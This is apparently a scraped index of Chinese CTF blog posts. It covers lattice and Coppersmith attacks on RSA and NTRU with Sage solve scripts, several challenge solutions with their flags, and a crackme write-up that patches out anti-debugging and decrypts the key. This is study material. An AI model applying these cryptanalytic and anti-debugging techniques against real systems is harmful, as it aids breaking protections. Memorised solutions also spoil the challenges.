[+]n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 [+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530[+]d&amp;((1&lt;&lt;512)-1)=787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736135616230383637343566366563373435363139613862363566653465633536307dchallenge3 completed solve 公钥e和私钥d满足： e*d = k*(p-1)*(q-1)两边乘p e*d*p=k*(p^2-1)*(n-1)模上1&lt;&lt;512 e*d_{low}*p_{low}=k*(p^2_{low}-n-p^2_{low}) mod\\ 1","link":"/2022/04/24/Crypto-CopperSmith/"},{"title":"Crypto NTRU密码系统","text":"[TOC] 基本知识算法参数算法中包括三个整数$N,p,q$ 和四个次数为 $N-1$ 的整系数多项式集合 L_f, L_g, L_{\\phi}, L_m其中 $p,q$ 不要求为素数，但满足 $(p,q)=1且q&gt;p$ 密钥生成随机选取两个多项式$f,g\\in L_g$ ，要求这两个多项式在模 $p$ 和模 $q$ 下均可逆，其逆元分别表示为 $F_p$ 和 $F_q$ ，即 F_q*f\\equiv 1 (mod\\ q)\\\\ F_p*f\\equiv 1 (mod\\ p)计算公钥 $h$ 满足 h\\equiv F_q*g\\ (mod\\ q)私钥为 $(f,f_p)$ 加密发送方选取随机多项式 $\\phi \\in L_{\\phi}$ 使用公钥 $h$ 对消息进行加密 e\\equiv p\\phi *h+m\\ (mod\\ q)\\\\将$e$发送给接收方 解密计算 a\\equiv f*e\\ (mod\\ q)\\\\ m\\equiv F_p*a\\ mod\\ q即可得到原文m 攻击方法一般可通过构造整数格，结合LLL算法来获取解密密钥 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#Sage #多项式N =p =q =Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]ex = hx = print('-------decrypt------')qq = x^N-1pp = y^N-1hn = [int(x) for x in hx.coefficients()]n = len(hn)A1 = matrix.identity(n)A0 = matrix.zero(n)Aq = matrix.identity(n) * qAh = matrix(ZZ, [hn[-i:] + hn[:-i] for i in range(n)])M = block_matrix([A1,Ah,A0,Aq],nrows=2)L = M.LLL()v = L[0]f = list(v)[:n]g = list(v)[n:]fx = Q(f)fy = P(f)gx = Q(g)Fqx = fx.inverse_mod(qq)Fpy = fy.inverse_mod(pp)#hxx = (Fqx*gx).mod(x^N-1)#print(hxx==hx)ax = (fx*ex).mod(qq)an = [int(x) for x in ax.coefficients()]#中心提升(centerlift)，使域范围从[0,q)变换到(-q/2,q/2)for i in range(len(an)): if an[i] &gt; q//2: an[i] -= qax = P(an)print(ax)out = (Fpy * ax).mod(pp)print(out)print(bytes(out.coefficients())) 多项式RSA部分题目会将flag作为多项式的系数，并将多项式乘e次方来加密。而注意flag长度一般为40字节左右，当模数p较小时，所模的多项式N或许可以直接分解 在求解解密指数d时，需要注意$\\phi(N)=p^{P.degree()-1}*p^{Q.degree()-1}$ 。这里需要回到欧拉函数的原始定义。对于正整数 $n$ ，欧拉函数 $\\phi(n)$的含义为与不大于整数 $n$ 且与 $n$ 互素的整数个数。而处于多项式环时，欧拉函数 $\\phi(N)$ 的含义变为了幂级小于多项式 $N$ 且与多项式 $N$ 互素的多项式个数。而模数为 $p$，最高项次数为 $degree$ 的多项式共有 $p^{degree}$ 个，而 $P$ 为不可约多项式，即除他自身外的多项式都与他不可约，即 $\\phi(P)=p^{degree}-1$ （类比素数p的$\\phi(p)$） 题目NTRURSAproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from Crypto.Util.number import *from gmpy2 import *from secret import flagdef gen(): p1 = getPrime(256) while True: f = getRandomRange(1, iroot(p1 // 2, 2)[0]) g = getRandomRange(iroot(p1 // 4, 2)[0], iroot(p1 // 2, 2)[0]) if gcd(f, p1) == 1 and gcd(f, g) == 1 and isPrime(g) == 1: break rand = getRandomRange(0, 2 ^ 20) g1 = g ^^ rand h = (inverse(f, p1) * g1) % p1 return h, p1, g, f, g1def gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return outh, p1, g, f, g1 = gen()q = getPrime(1024)n = g * q e = 0x10001c1 = pow(bytes_to_long(flag), e, n)hint = list(str(h))length = len(hint)bits = 16p2 = random_prime(2 ^ bits - 1, False, 2 ^ (bits - 1))R.&lt;x&gt; = PolynomialRing(GF(p2))P = gen_irreducable_poly(ZZ.random_element(length, 2 * length))Q = gen_irreducable_poly(ZZ.random_element(length, 2 * length))N = P * QS.&lt;x&gt; = R.quotient(N)m = S(hint)c2 = m ^ eprint(&quot;p1 =&quot;, p1)print(&quot;c1 =&quot;, c1)print(&quot;p2 =&quot;, p2)print(&quot;c2 =&quot;, c2)print(&quot;n =&quot;, n)print(&quot;N =&quot;, N)'''p1 = 106472061241112922861460644342336453303928202010237284715354717630502168520267c1 = 20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714p2 = 64621c2 = 19921*x^174 + 49192*x^173 + 18894*x^172 + 61121*x^171 + 50271*x^170 + 11860*x^169 + 53128*x^168 + 38658*x^167 + 14191*x^166 + 9671*x^165 + 40879*x^164 + 15187*x^163 + 33523*x^162 + 62270*x^161 + 64211*x^160 + 54518*x^159 + 50446*x^158 + 2597*x^157 + 32216*x^156 + 10500*x^155 + 63276*x^154 + 27916*x^153 + 55316*x^152 + 30898*x^151 + 43706*x^150 + 5734*x^149 + 35616*x^148 + 14288*x^147 + 18282*x^146 + 22788*x^145 + 48188*x^144 + 34176*x^143 + 55952*x^142 + 9578*x^141 + 9177*x^140 + 22083*x^139 + 14586*x^138 + 9748*x^137 + 21118*x^136 + 155*x^135 + 64224*x^134 + 18193*x^133 + 33732*x^132 + 38135*x^131 + 51992*x^130 + 8203*x^129 + 8538*x^128 + 55203*x^127 + 5003*x^126 + 2009*x^125 + 45023*x^124 + 12311*x^123 + 21428*x^122 + 24110*x^121 + 43537*x^120 + 21885*x^119 + 50212*x^118 + 40445*x^117 + 17768*x^116 + 46616*x^115 + 4771*x^114 + 20903*x^113 + 47764*x^112 + 13056*x^111 + 50837*x^110 + 22313*x^109 + 39698*x^108 + 60377*x^107 + 59357*x^106 + 24051*x^105 + 5888*x^104 + 29414*x^103 + 31726*x^102 + 4906*x^101 + 23968*x^100 + 52360*x^99 + 58063*x^98 + 706*x^97 + 31420*x^96 + 62468*x^95 + 18557*x^94 + 1498*x^93 + 17590*x^92 + 62990*x^91 + 27200*x^90 + 7052*x^89 + 39117*x^88 + 46944*x^87 + 45535*x^86 + 28092*x^85 + 1981*x^84 + 4377*x^83 + 34419*x^82 + 33754*x^81 + 2640*x^80 + 44427*x^79 + 32179*x^78 + 57721*x^77 + 9444*x^76 + 49374*x^75 + 21288*x^74 + 44098*x^73 + 57744*x^72 + 63457*x^71 + 43300*x^70 + 1508*x^69 + 13775*x^68 + 23197*x^67 + 43070*x^66 + 20751*x^65 + 47479*x^64 + 18496*x^63 + 53392*x^62 + 10387*x^61 + 2317*x^60 + 57492*x^59 + 25441*x^58 + 52532*x^57 + 27150*x^56 + 33788*x^55 + 43371*x^54 + 30972*x^53 + 39583*x^52 + 36407*x^51 + 35564*x^50 + 44564*x^49 + 1505*x^48 + 47519*x^47 + 38695*x^46 + 43107*x^45 + 1676*x^44 + 42057*x^43 + 49879*x^42 + 29083*x^41 + 42241*x^40 + 8853*x^39 + 33546*x^38 + 48954*x^37 + 30352*x^36 + 62020*x^35 + 39864*x^34 + 9519*x^33 + 24828*x^32 + 34696*x^31 + 2387*x^30 + 27413*x^29 + 55829*x^28 + 40217*x^27 + 30205*x^26 + 42328*x^25 + 6210*x^24 + 52442*x^23 + 58495*x^22 + 2014*x^21 + 26452*x^20 + 33547*x^19 + 19840*x^18 + 5995*x^17 + 16850*x^16 + 37855*x^15 + 7221*x^14 + 32200*x^13 + 8121*x^12 + 23767*x^11 + 46563*x^10 + 51673*x^9 + 19372*x^8 + 4157*x^7 + 48421*x^6 + 41096*x^5 + 45735*x^4 + 53022*x^3 + 35475*x^2 + 47521*x + 27544n = 31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857N = 25081*x^175 + 8744*x^174 + 9823*x^173 + 9037*x^172 + 6343*x^171 + 42205*x^170 + 28573*x^169 + 55714*x^168 + 17287*x^167 + 11229*x^166 + 42630*x^165 + 64363*x^164 + 50759*x^163 + 3368*x^162 + 20900*x^161 + 55947*x^160 + 7082*x^159 + 23171*x^158 + 48510*x^157 + 20013*x^156 + 16798*x^155 + 60438*x^154 + 58779*x^153 + 9289*x^152 + 10623*x^151 + 1085*x^150 + 23473*x^149 + 13795*x^148 + 2071*x^147 + 31515*x^146 + 42832*x^145 + 38152*x^144 + 37559*x^143 + 47653*x^142 + 37371*x^141 + 39128*x^140 + 48750*x^139 + 16638*x^138 + 60320*x^137 + 56224*x^136 + 41870*x^135 + 63961*x^134 + 47574*x^133 + 63954*x^132 + 9668*x^131 + 62360*x^130 + 15244*x^129 + 20599*x^128 + 28704*x^127 + 26857*x^126 + 34885*x^125 + 33107*x^124 + 17693*x^123 + 52753*x^122 + 60744*x^121 + 21305*x^120 + 63785*x^119 + 54400*x^118 + 17812*x^117 + 64549*x^116 + 20035*x^115 + 37567*x^114 + 38607*x^113 + 32783*x^112 + 24385*x^111 + 5387*x^110 + 5134*x^109 + 45893*x^108 + 58307*x^107 + 33821*x^106 + 54902*x^105 + 14236*x^104 + 58044*x^103 + 41257*x^102 + 46881*x^101 + 42834*x^100 + 1693*x^99 + 46058*x^98 + 15636*x^97 + 27111*x^96 + 3158*x^95 + 41012*x^94 + 26028*x^93 + 3576*x^92 + 37958*x^91 + 33273*x^90 + 60228*x^89 + 41229*x^88 + 11232*x^87 + 12635*x^86 + 17942*x^85 + 4*x^84 + 25397*x^83 + 63526*x^82 + 54872*x^81 + 40318*x^80 + 37498*x^79 + 52182*x^78 + 48817*x^77 + 10763*x^76 + 46542*x^75 + 36060*x^74 + 49972*x^73 + 63603*x^72 + 46506*x^71 + 44788*x^70 + 44905*x^69 + 46112*x^68 + 5297*x^67 + 26440*x^66 + 28470*x^65 + 15525*x^64 + 11566*x^63 + 15781*x^62 + 36098*x^61 + 44402*x^60 + 55331*x^59 + 61583*x^58 + 16406*x^57 + 59089*x^56 + 53161*x^55 + 43695*x^54 + 49580*x^53 + 62685*x^52 + 31447*x^51 + 26755*x^50 + 14810*x^49 + 3281*x^48 + 27371*x^47 + 53392*x^46 + 2648*x^45 + 10095*x^44 + 25977*x^43 + 22912*x^42 + 41278*x^41 + 33236*x^40 + 57792*x^39 + 7169*x^38 + 29250*x^37 + 16906*x^36 + 4436*x^35 + 2729*x^34 + 29736*x^33 + 19383*x^32 + 11921*x^31 + 26075*x^30 + 54616*x^29 + 739*x^28 + 38509*x^27 + 19118*x^26 + 20062*x^25 + 21280*x^24 + 12594*x^23 + 14974*x^22 + 27795*x^21 + 54107*x^20 + 1890*x^19 + 13410*x^18 + 5381*x^17 + 19500*x^16 + 47481*x^15 + 58488*x^14 + 26433*x^13 + 37803*x^12 + 60232*x^11 + 34772*x^10 + 1505*x^9 + 63760*x^8 + 20890*x^7 + 41533*x^6 + 16130*x^5 + 29769*x^4 + 49142*x^3 + 64184*x^2 + 55443*x + 45925''' AnalysisN是由两个多项式P、Q相乘得到的，但由于比较小，可以直接分解，通过多项式RSA还原得到h 在还原h后，通过以下关系式 h=f^{-1}*g_1\\ mod p_1\\\\ h*f-k*p_1=g_1构建矩阵 \\begin{array}{1} h & p_1\\\\ 1 & 0 \\end{array}通过LLL算法得到 $g_1$ 和 $f$（h和p1都是256位，而 $g_1, f$ 仅为128位） 在得到 $g_1$ 后，就能通过爆破来分解n了 Solve12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *p= 64621P = PolynomialRing(Zmod(p), name = 'x')x = P.gen()e = 0x10001n = 25081*x^175 + 8744*x^174 + 9823*x^173 + 9037*x^172 + 6343*x^171 + 42205*x^170 + 28573*x^169 + 55714*x^168 + 17287*x^167 + 11229*x^166 + 42630*x^165 + 64363*x^164 + 50759*x^163 + 3368*x^162 + 20900*x^161 + 55947*x^160 + 7082*x^159 + 23171*x^158 + 48510*x^157 + 20013*x^156 + 16798*x^155 + 60438*x^154 + 58779*x^153 + 9289*x^152 + 10623*x^151 + 1085*x^150 + 23473*x^149 + 13795*x^148 + 2071*x^147 + 31515*x^146 + 42832*x^145 + 38152*x^144 + 37559*x^143 + 47653*x^142 + 37371*x^141 + 39128*x^140 + 48750*x^139 + 16638*x^138 + 60320*x^137 + 56224*x^136 + 41870*x^135 + 63961*x^134 + 47574*x^133 + 63954*x^132 + 9668*x^131 + 62360*x^130 + 15244*x^129 + 20599*x^128 + 28704*x^127 + 26857*x^126 + 34885*x^125 + 33107*x^124 + 17693*x^123 + 52753*x^122 + 60744*x^121 + 21305*x^120 + 63785*x^119 + 54400*x^118 + 17812*x^117 + 64549*x^116 + 20035*x^115 + 37567*x^114 + 38607*x^113 + 32783*x^112 + 24385*x^111 + 5387*x^110 + 5134*x^109 + 45893*x^108 + 58307*x^107 + 33821*x^106 + 54902*x^105 + 14236*x^104 + 58044*x^103 + 41257*x^102 + 46881*x^101 + 42834*x^100 + 1693*x^99 + 46058*x^98 + 15636*x^97 + 27111*x^96 + 3158*x^95 + 41012*x^94 + 26028*x^93 + 3576*x^92 + 37958*x^91 + 33273*x^90 + 60228*x^89 + 41229*x^88 + 11232*x^87 + 12635*x^86 + 17942*x^85 + 4*x^84 + 25397*x^83 + 63526*x^82 + 54872*x^81 + 40318*x^80 + 37498*x^79 + 52182*x^78 + 48817*x^77 + 10763*x^76 + 46542*x^75 + 36060*x^74 + 49972*x^73 + 63603*x^72 + 46506*x^71 + 44788*x^70 + 44905*x^69 + 46112*x^68 + 5297*x^67 + 26440*x^66 + 28470*x^65 + 15525*x^64 + 11566*x^63 + 15781*x^62 + 36098*x^61 + 44402*x^60 + 55331*x^59 + 61583*x^58 + 16406*x^57 + 59089*x^56 + 53161*x^55 + 43695*x^54 + 49580*x^53 + 62685*x^52 + 31447*x^51 + 26755*x^50 + 14810*x^49 + 3281*x^48 + 27371*x^47 + 53392*x^46 + 2648*x^45 + 10095*x^44 + 25977*x^43 + 22912*x^42 + 41278*x^41 + 33236*x^40 + 57792*x^39 + 7169*x^38 + 29250*x^37 + 16906*x^36 + 4436*x^35 + 2729*x^34 + 29736*x^33 + 19383*x^32 + 11921*x^31 + 26075*x^30 + 54616*x^29 + 739*x^28 + 38509*x^27 + 19118*x^26 + 20062*x^25 + 21280*x^24 + 12594*x^23 + 14974*x^22 + 27795*x^21 + 54107*x^20 + 1890*x^19 + 13410*x^18 + 5381*x^17 + 19500*x^16 + 47481*x^15 + 58488*x^14 + 26433*x^13 + 37803*x^12 + 60232*x^11 + 34772*x^10 + 1505*x^9 + 63760*x^8 + 20890*x^7 + 41533*x^6 + 16130*x^5 + 29769*x^4 + 49142*x^3 + 64184*x^2 + 55443*x + 45925c = 19921*x^174 + 49192*x^173 + 18894*x^172 + 61121*x^171 + 50271*x^170 + 11860*x^169 + 53128*x^168 + 38658*x^167 + 14191*x^166 + 9671*x^165 + 40879*x^164 + 15187*x^163 + 33523*x^162 + 62270*x^161 + 64211*x^160 + 54518*x^159 + 50446*x^158 + 2597*x^157 + 32216*x^156 + 10500*x^155 + 63276*x^154 + 27916*x^153 + 55316*x^152 + 30898*x^151 + 43706*x^150 + 5734*x^149 + 35616*x^148 + 14288*x^147 + 18282*x^146 + 22788*x^145 + 48188*x^144 + 34176*x^143 + 55952*x^142 + 9578*x^141 + 9177*x^140 + 22083*x^139 + 14586*x^138 + 9748*x^137 + 21118*x^136 + 155*x^135 + 64224*x^134 + 18193*x^133 + 33732*x^132 + 38135*x^131 + 51992*x^130 + 8203*x^129 + 8538*x^128 + 55203*x^127 + 5003*x^126 + 2009*x^125 + 45023*x^124 + 12311*x^123 + 21428*x^122 + 24110*x^121 + 43537*x^120 + 21885*x^119 + 50212*x^118 + 40445*x^117 + 17768*x^116 + 46616*x^115 + 4771*x^114 + 20903*x^113 + 47764*x^112 + 13056*x^111 + 50837*x^110 + 22313*x^109 + 39698*x^108 + 60377*x^107 + 59357*x^106 + 24051*x^105 + 5888*x^104 + 29414*x^103 + 31726*x^102 + 4906*x^101 + 23968*x^100 + 52360*x^99 + 58063*x^98 + 706*x^97 + 31420*x^96 + 62468*x^95 + 18557*x^94 + 1498*x^93 + 17590*x^92 + 62990*x^91 + 27200*x^90 + 7052*x^89 + 39117*x^88 + 46944*x^87 + 45535*x^86 + 28092*x^85 + 1981*x^84 + 4377*x^83 + 34419*x^82 + 33754*x^81 + 2640*x^80 + 44427*x^79 + 32179*x^78 + 57721*x^77 + 9444*x^76 + 49374*x^75 + 21288*x^74 + 44098*x^73 + 57744*x^72 + 63457*x^71 + 43300*x^70 + 1508*x^69 + 13775*x^68 + 23197*x^67 + 43070*x^66 + 20751*x^65 + 47479*x^64 + 18496*x^63 + 53392*x^62 + 10387*x^61 + 2317*x^60 + 57492*x^59 + 25441*x^58 + 52532*x^57 + 27150*x^56 + 33788*x^55 + 43371*x^54 + 30972*x^53 + 39583*x^52 + 36407*x^51 + 35564*x^50 + 44564*x^49 + 1505*x^48 + 47519*x^47 + 38695*x^46 + 43107*x^45 + 1676*x^44 + 42057*x^43 + 49879*x^42 + 29083*x^41 + 42241*x^40 + 8853*x^39 + 33546*x^38 + 48954*x^37 + 30352*x^36 + 62020*x^35 + 39864*x^34 + 9519*x^33 + 24828*x^32 + 34696*x^31 + 2387*x^30 + 27413*x^29 + 55829*x^28 + 40217*x^27 + 30205*x^26 + 42328*x^25 + 6210*x^24 + 52442*x^23 + 58495*x^22 + 2014*x^21 + 26452*x^20 + 33547*x^19 + 19840*x^18 + 5995*x^17 + 16850*x^16 + 37855*x^15 + 7221*x^14 + 32200*x^13 + 8121*x^12 + 23767*x^11 + 46563*x^10 + 51673*x^9 + 19372*x^8 + 4157*x^7 + 48421*x^6 + 41096*x^5 + 45735*x^4 + 53022*x^3 + 35475*x^2 + 47521*x + 27544#分解Nq1, q2 = n.factor()q1, q2 = q1[0], q2[0]#求φ，注意求法，phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)m = pow(c,d,n)h = ''for i in range(77): h+=str(m[i])h = int(h)p = 106472061241112922861460644342336453303928202010237284715354717630502168520267c = 20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g1 = m.LLL()[0]g1 = 228679177303871981036829786447405151037n = 31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857for i in range(2^20): q = g1 ^^ i if n % q == 0: p = n // q phi = (p-1) * (q-1) d = inverse(0x10001,phi) print(long_to_bytes(int(pow(c,d,n))))# b'DASCTF{P01yn0m141RS4_W17h_NTRU}' [2019 巅峰极客]NTRUEproblem123456789101112131415161718192021222324252627from Crypto.Util.number import *import gmpy2from flag import flagdef generate(): p = getStrongPrime(2048) while True: f = getRandomNBitInteger(1024) g = getStrongPrime(768) h = gmpy2.invert(f, p) * g % p return (p, f, g, h)def encrypt(plaintext, p, h): m = bytes_to_long(plaintext) r = getRandomNBitInteger(1024) c = (r * h + m) % p return cp, f, g, h = generate()c = encrypt(flag, p, h)with open(&quot;cipher.txt&quot;, &quot;w&quot;) as f: f.write(&quot;h = &quot; + str(h) + &quot;\\n&quot;) f.write(&quot;p = &quot; + str(p) + &quot;\\n&quot;) f.write(&quot;c = &quot; + str(c) + &quot;\\n&quot;) Analysis注意到 $cf=rg+m*f$ 即可 这位博主讲的挺清晰的 从一道CTF题初探NTRU格密码 - 先知社区 (aliyun.com) Solve123456789101112import gmpy2from Crypto.Util.number import long_to_bytesh = 7257231567493321493497732423756001924698993879741072696808433246581786362611889417289029671240997843541696187487722285762633068287623369923457879458577466240950224087015909821079480431797917376609839097610864517760515986973340148901898582075413756737310797402537478388864632901178463429574227279668004092519322204990617969134092793157225082977967228366838748193084097651575835471869030934527383379794480007872562067799484905159381690179011192017159985260435844246766711550315143517066359521598424992244464723490166447105679062078049379153154659732304112563255058750656946353654402824529058734270363154894216317570784p = 23969137365202547728693945383611572667294904799854243194734466236017441545927679469239814785947383727854265554138290421827510545078908517696536495567625593439996528098119344504866817224169113920532528233185011693829122447604993468817512696036673804626830507903206709121383065701222707251053362179946170981868061834734684494881504724254812067180384269711822738708203454131838741703416329765575995359232573740932069147491776326045743679105041246906081872936901848272288949389026129761726749334006319072981386763830897454245553866145620689939497868469730297795063648030738668273210516497399954626983672357236110363894081c = 6388077150013017095358415295704360631706672647932184267739118115740221804173068089559645506533240372483689997499821300861865955720630884024099415936433339512125910973936154713306915269365877588850574948033131161679256849814325373882706559635563285860782658950169507940368219930971600522754831612134153314448445006958300840618894359885321144158064446236744722180819829183828290798747455324761671198097712539900569386477647697973195787663298318786718012522378981137877863153067057280649127202971806609339007027052518049995341356359016898069863799529357397514218249272201695539181908803360181347114492616706419618151757v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f,g=m.LLL()[0]a=f*c %pm=a*gmpy2.invert(f,g) %gprint(long_to_bytes(m)) 参考资料 (44条消息) 密码学基础之NTRU公钥密码系统【笔记】_听着小曲敲代码的博客-CSDN博客_ntru NTRU - PamShao - 博客园 (cnblogs.com) 第四届浙江省大学生网络与信息安全竞赛（决赛）dssssa1及easyNTRU复现 - 21r000 - 博客园 (cnblogs.com)","link":"/2022/08/14/Crypto-NTRU%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/"},{"title":"DASCTF Apr Writeup","text":"学习一下不会的题 [TOC] Cryptospecial_rsa题目描述123456789101112131415161718192021222324from Crypto.Util.number import *def getPrime1(bitLength, e): while True: i = getPrime(bitLength) if (i - 1) % e ** 2 == 0: return iflag=b'DASCTF{????????????????????}'m = bytes_to_long(flag)lenth = ((len(bin(m)) - 2) // 2) + 9e=113p = getPrime1(lenth, e)q = getPrime1(lenth, e)n=p*qprint(f&quot;n = {n}&quot;)c = pow(m, e, n)for i in range(26): lenth = ((len(bin(c)) - 2) // 2) + 9 p = getPrime1(lenth, e) q = getPrime1(lenth, e) n=p*q print(f&quot;n = {n}&quot;) c=pow(c,e,n)print(f&quot;e = {e}&quot;)print(f&quot;c = {c}&quot;) 分析：首先可以看到题目中生成的n的位数较小，通过factordb.com可以将27轮的n全部分解。而问题在于getPrime1这个函数，它所生成的p和q满足 (p-1)\\%e^2\\equiv0也就是说，无法通过对 $phi$ 求逆来得到 $d$ ，需要通过求解高次同余方程来得到flag。而求解高次同余方程的主要算法为AMM算法。（可是不知道为什么在s=2的情况下，我自己写的AMM和网上找到的大部分AMM脚本都无法求得正确解）好在有sage封装好的函数，可以直接求解这个问题 还在得到方程的全部解后，问题就变成了怎么筛选合适的根，一个直观的想法就是加密时每一轮生成的密文都是小于当轮的n，由此我们可以利用上一轮的n来筛选此轮求得的c 当然，每一轮求得的满足条件的c可能不止一个，但是也不会太多，轮着试即可。 脚本：由于每轮解出来的c都不一样，而我又懒得写一轮过的脚本，就放了个从第四轮截断的脚本 12345678910111213141516171819c=83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801for i in range(4,-1,-1): print('round%d'%i) P.&lt;x&gt;=PolynomialRing(Zmod(p[i]),implementation='NTL') Q.&lt;y&gt;=PolynomialRing(Zmod(n[i]//p[i]),implementation='NTL') f=x^e-c g=y^e-c root_p=f.monic().roots() root_q=g.monic().roots() root_n=[] for pp in root_p: for qq in root_q: tmp=crt([int(pp[0]),int(qq[0])],[p[i],n[i]//p[i]]) if tmp&lt;n[i-1]: if i==0: print(n2s(int(tmp))) c=tmp print('end') 最后出来一堆乱码，在里面搜“DASCTF”即可 CVE OF RSAroca漏洞，推荐使用以下代码 crypto-attacks/roca.py at c26872bdac2e2d95c5be00e6e593c891c849f446 · jvdsn/crypto-attacks (github.com) ReverseCrackme拖进IDA，shift+f12搜索Wrong，迅速进到关键函数 可以看到password长度要求为8，flag要求长度为32，中间存在一些加密函数 有对比函数，尝试动调看对比的是啥玩意 调试不动，存在反调试机制，查了一下是ZwSetInformationThread ZwSetInformationThread - CTF Wiki (ctf-wiki.org) 字符串中搜索ZwSetInformation，定位到反调试函数，将此处的11h改为其他数字即可 继续调，在sub_1031e0处下断点，可以看到this的值为0xeff710，而根据memcmp的参数，我们可以推断出要比较的内容分别放在0xeff7ec、0xeff8f0、0xeff9f4，分别到这两个地方取出要比较的内容，分别为0x9f77c2a4ac5c0a671321bbe1e9972af6、0xd59f8e94b0e1de6e329518a0c444aa94de7c8d44、0x5b9ceeb23bb7d734f31b7514c6b21fe8de334474751b476ad4375188fc67e660da0d5827814353ea7b52856c8665afb4 再去看sub_103510里面对变量做了什么处理，可以看到是调用的库函数进行加密处理。通过这个网站CryptDeriveKey function (wincrypt.h) - Win32 apps | Microsoft Docs 可以查询到对应函数的作用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455bool __stdcall sub_103510(BYTE *pbData, DWORD dwDataLen, ALG_ID Algid, int a4, int a5){ bool result; // al _DWORD var20; // [esp+10h] [ebp-20h] _DWORD var18; // [esp+18h] [ebp-18h] BYTE var14[4]; // [esp+1Ch] [ebp-14h] DWORD pdwDataLen; // [esp+20h] [ebp-10h] HCRYPTPROV phProv; // [esp+24h] [ebp-Ch] HCRYPTHASH phHash; // [esp+28h] [ebp-8h] phProv = 0; phHash = 0; var20 = 0; *var14 = 0; pdwDataLen = 0; var18 = CryptAcquireContextA(&amp;phProv, 0, 0, 0x18u, 0xF0000000); if ( var18 ) { var18 = CryptCreateHash(phProv, Algid, 0, 0, &amp;phHash); if ( var18 ) { var18 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( var18 ) { pdwDataLen = 4; var18 = CryptGetHashParam(phHash, 4u, var14, &amp;pdwDataLen, 0); if ( var18 ) { var20 = sub_104540(*var14); if ( var20 ) { memset(var20, 0, *var14); var18 = CryptGetHashParam(phHash, 2u, var20, var14, 0); if ( var18 ) { *a4 = var20; *a5 = *var14; } } else { var18 = 0; } } } } } if ( !var18 &amp;&amp; var20 ) sub_10453B(var20); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return var18;} 分析后大概可以知道大概流程如下 通过爆破或者在线查询可以得到这些哈希值对应的原像为NocT、uRne，然后模仿加密流程写出解密代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;windows.h&gt;#include &lt;windef.h&gt;#include &lt;wincrypt.h&gt;#include &lt;stdio.h&gt;int main(void){ BOOL v6; // [esp+4h] [ebp-18h] HCRYPTKEY phKey; // [esp+Ch] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+10h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+14h] [ebp-8h] BYREF phProv = 0; phHash = 0; phKey = 0; BYTE key[] = { 0x5c, 0x53, 0xa4, 0xa4, 0x1d, 0x52, 0x43, 0x7a, 0x9f, 0xa1, 0xe9, 0xc2, 0x6c, 0xa5, 0x90, 0x90 }; BYTE input[] = { 0x5B, 0x9C, 0xEE, 0xB2, 0x3B, 0xB7, 0xD7, 0x34, 0xF3, 0x1B, 0x75, 0x14, 0xC6, 0xB2, 0x1F, 0xE8, 0xDE, 0x33, 0x44, 0x74, 0x75, 0x1B, 0x47, 0x6A, 0xD4, 0x37, 0x51, 0x88, 0xFC, 0x67, 0xE6, 0x60, 0xDA, 0x0D, 0x58, 0x07, 0x81, 0x43, 0x53, 0xEA, 0x7B, 0x52, 0x85, 0x6C, 0x86, 0x65, 0xAF, 0xB4 }; DWORD keyLen = 0x10; DWORD inputLen = 0x20; DWORD * t = &amp;inputLen; v6 = CryptAcquireContextA(&amp;phProv, 0, 0, 0x18u, 0xF0000000); if (v6) { v6 = CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash); if (v6) { v6 = CryptHashData(phHash, key, keyLen, 0); if (v6) { v6 = CryptDeriveKey(phProv, 0x660Eu, phHash, 1u, &amp;phKey); if (v6) v6 = CryptDecrypt(phKey, 0, 1, 0, input, t); printf(&quot;%s&quot;, input); } } } if (phKey) CryptDestroyKey(phKey); if (phHash) CryptDestroyHash(phHash); if (phProv) CryptReleaseContext(phProv, 0); return 0;} 最后附加一个c++逆向 [系统安全20]动态调试技巧-C++代码逆向 - 17bdw - 博客园 (cnblogs.com) FakePica用jadx打开的时候遇到了代码重构失败的问题，推测是加了壳，上网搜wp开始抄 可以使用这个工具进行脱壳CodingGay/BlackDex: BlackDex is an Android unpack(dexdump) tool, it supports Android 5.0~12 and need not rely to any environment. 